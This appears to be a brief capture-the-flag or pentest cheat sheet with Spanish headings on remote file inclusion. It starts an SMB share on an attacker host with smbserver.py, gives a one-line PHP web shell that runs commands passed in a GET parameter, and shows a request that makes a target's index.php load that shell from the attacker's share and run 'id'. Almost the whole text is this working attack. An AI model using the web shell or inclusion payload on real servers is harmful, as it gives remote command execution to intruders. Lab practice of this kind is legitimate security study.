## Servidor SMB

```python
IP = 10.10.10.14

smbserver.py -smb2support share $(pwd)
```

## shell.php

```python
<?php system($_GET['cmd']); ?>
```

## RFI

```python
http://10.10.10.26/index.php?language=\\10.10.10.14\share\shell.php&cmd=id
```
